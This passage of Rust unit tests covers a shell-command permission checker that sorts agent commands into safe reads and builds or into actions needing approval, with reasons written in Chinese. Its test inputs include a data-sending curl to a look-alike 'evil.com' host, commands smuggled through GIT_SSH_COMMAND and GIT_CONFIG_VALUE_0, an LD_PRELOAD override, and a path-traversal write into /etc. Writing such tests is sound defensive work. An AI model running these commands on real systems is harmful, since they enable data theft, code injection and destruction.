        reasons(command, Dialect::Posix)
    }

    #[test]
    fn reading_building_and_unknown_tools_run_without_asking() {
        for command in [
            r#"cd /g/hytech/quote-hub && git ls-files 'src/**' | while read f; do wc -l "$f"; done | sort -n"#,
            "dotnet package search Pomelo.EntityFrameworkCore.MySql --take 10 2>&1 | head -60",
            "dotnet --list-sdks && dotnet --list-runtimes | head -30",
            r#"P=/c/Users/v/venv/Scripts; ls -la "$P" | head -30; hermes --version 2>&1 | head -20; echo "exit=$?""#,
            r#"for n in a b; do printf '%-10s -> ' "$n"; command -v "$n" 2>/dev/null || echo none; done"#,
            "cargo test --all && cargo clippy --all-targets",
            "npm run build && npm test",
            "python tools/gen.py --check",
            "./scripts/build.sh release",
            "hermes doctor --verbose",
            "git add -A && git commit -m 'fix: x' && git log --oneline -3",
            "git fetch origin && git status",
            "curl -s https://example.com/api | jq .",
            "mkdir -p out && touch out/.keep",
            "bash -c 'ls -la && cat README.md'",
            "find . -name '*.rs' -exec wc -l {} +",
            "git ls-files | xargs grep -n TODO",
            "kubectl get pods -A",
            "docker ps -a && docker logs web",
            "python -m pytest -q && python -m pip list",
            "tar -tzf a.tgz",
            // From real sessions:
            "git ls-remote --tags origin v0.6.0 && git rev-parse v0.6.0^{commit}",
            r#"git tag -a v0.6.0 -m "cove 0.6.0""#,
            "git reset -q && git status --short",
            "time env GIT_EDITOR=true GIT_PAGER=cat PAGER=cat NO_COLOR=1 TERM=dumb GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=false go test ./...",
            "export PYTHONIOENCODING=utf-8 && python b.py x",
            "go test ./... > /tmp/cove_test.log 2>&1; tail -5 /tmp/cove_test.log",
            "cp Cargo.lock /tmp/current-Cargo.lock",
            r#"curl -s -o /dev/null -w "%{http_code}" https://example.com/"#,
            r#"curl -s http://127.0.0.1:9931/completion -H "Content-Type: application/json" -d '{"prompt":"Hi"}' > /tmp/t.json"#,
            "cargo fmt --version",
            r#"for bv in A B; do t=$(curl -s "https://x.com/view?bvid=$bv" | jq -r .title); echo "$bv $t"; done"#,
            r#"powershell -NoProfile -Command "$f='D:\m.gguf'; if(Test-Path $f){ (Get-Item $f).Length } else { 'missing' }""#,
        ] {
            assert_eq!(posix(command), Vec::<String>::new(), "{command}");
        }
        let ps = |c| reasons(c, Dialect::PowerShell);
        assert!(ps("Get-ChildItem -Recurse | Where-Object { $_.Length -gt 1 } | Select-Object FullName").is_empty());
        assert!(ps("$x = Get-Content a.txt; $x.Length").is_empty());
        let cmd = |c| reasons(c, Dialect::Cmd);
        assert!(cmd("dir /s /b src & type a.txt | findstr foo").is_empty());
    }

    #[test]
    fn changes_deletions_remote_and_hidden_code_ask_with_a_reason() {
        for (command, reason) in [
            ("rm -rf build", "删除文件（rm）"),
            ("echo hi > notes.txt", "写入文件（重定向到 notes.txt）"),
            ("mv a.txt b.txt", "修改文件（mv）"),
            ("sed -i 's/a/b/' a.rs", "原地修改文件（sed -i）"),
            ("cargo fmt", "原地改写源码（cargo）"),
            ("prettier --write src", "原地改写源码（prettier）"),
            ("git push origin main", "推送到远端（git push）"),
            ("git reset --hard HEAD~1", "移动分支指针或丢弃改动（git reset）"),
            ("git checkout main", "修改工作区或仓库历史（git checkout）"),
            ("npm install left-pad", "安装、卸载或更新依赖（npm install）"),
            ("cargo add serde", "安装、卸载或更新依赖（cargo add）"),
            ("go get example.com/x", "安装、卸载或更新依赖（go get）"),
            ("npm publish", "发布或修改远端（npm publish）"),
            ("curl -X POST https://x/api -d a=1", "向远端发送修改请求（curl）"),
            ("curl -o x.zip https://x/x.zip", "下载文件到本地（curl -o）"),
            ("gh pr create --fill", "修改 GitHub 上的内容（gh pr create）"),
            ("kubectl apply -f k.yaml", "修改集群资源（kubectl apply）"),
            ("python -c 'import os'", "执行内联代码（python -c）"),
            ("node -e 'require(1)'", "执行内联代码（node）"),
            ("eval \"$cmd\"", "执行动态代码（eval）"),
            ("$cmd --run", "程序名来自变量，无法预知运行什么"),
            ("sudo ls", "提权运行（sudo）"),
            ("kill 1234", "结束进程（kill）"),
            ("PATH=/tmp:$PATH; ls", "修改 shell 控制变量（PATH）"),
            ("export LD_PRELOAD=/tmp/x.so", "修改影响子进程的环境变量（LD_PRELOAD）"),
            ("bash -c 'rm -rf x'", "删除文件（rm）"),
            ("find . -name '*.tmp' -delete", "删除文件（find -delete）"),
            ("find . -exec rm {} +", "删除文件（rm）"),
            ("git ls-files | xargs rm", "删除文件（rm）"),
            ("python3 <<EOF\nprint(1)\nEOF", "从标准输入执行代码（python）"),
            ("tar -xzf a.tgz", "解压或打包写文件（tar）"),
            ("git reset --soft HEAD~1", "移动分支指针或丢弃改动（git reset）"),
            ("git tag -d v1", "删除或覆盖标签（git tag）"),
            ("git branch -m old new", "删除、重命名或覆盖分支（git branch）"),
            ("env GIT_SSH_COMMAND='sh x' git fetch", "修改影响子进程的环境变量（GIT_SSH_COMMAND）"),
            ("env GIT_CONFIG_VALUE_0='!sh x' git status", "修改影响子进程的环境变量（GIT_CONFIG_VALUE_0）"),
            ("echo x > /tmp/../etc/x", "写入文件（重定向到 /tmp/../etc/x）"),
            ("cp /tmp/x src/x", "修改文件（cp）"),
            ("curl -X DELETE http://localhost:8080/items/1", "向远端发送修改请求（curl）"),
            ("curl -d a=1 http://127.0.0.1.evil.com/x", "向远端发送修改请求（curl）"),
            ("curl $args https://x", "参数含变量，无法确认不会写文件（curl）"),
        ] {
            let got = posix(command);
            assert!(got.contains(&reason.to_owned()), "{command}: {got:?}");
        }
        let ps = |c| reasons(c, Dialect::PowerShell);
        assert!(ps("Remove-Item -Recurse x").contains(&"删除文件（remove-item）".to_owned()));
        assert!(ps("Get-ChildItem | ForEach-Object { Remove-Item $_ }").contains(&"删除文件（remove-item）".to_owned()));
        assert!(ps("Set-Content a.txt hi").contains(&"修改文件（set-content）".to_owned()));
        assert!(ps("Invoke-WebRequest https://x -OutFile a.zip").iter().any(|r| r.contains("下载文件")));
        assert!(!ps("$env:PATH = 'C:\\x'").is_empty());
        let cmd = |c| reasons(c, Dialect::Cmd);
        assert!(cmd("del /q x").contains(&"删除文件（del）".to_owned()));
        assert!(!cmd("if exist a (del a)").is_empty());
    }
}
